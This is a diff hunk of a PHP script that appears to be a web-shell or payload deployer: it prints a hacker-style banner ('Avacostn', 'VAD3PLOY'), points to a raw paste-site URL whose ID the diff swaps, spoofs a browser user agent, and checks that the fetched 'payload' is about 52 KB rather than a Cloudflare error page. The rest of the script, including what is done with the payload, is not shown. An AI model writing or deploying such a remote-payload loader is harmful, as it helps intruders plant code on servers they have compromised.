@@ -12,7 +12,7 @@ $m="VA"."D3PLOY";
 echo "<h1 style='color: red;'><strong>[ Avacostn ] - ";
 echo $m;
 
-$u="https://pastefy.app/4XIQKnIj/raw";
+$u="https://pastefy.app/qxL9YNeY/raw";
 $ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
 $min=20000;   // pastefy payload is ~52 KB; anything smaller is a CF error page
 
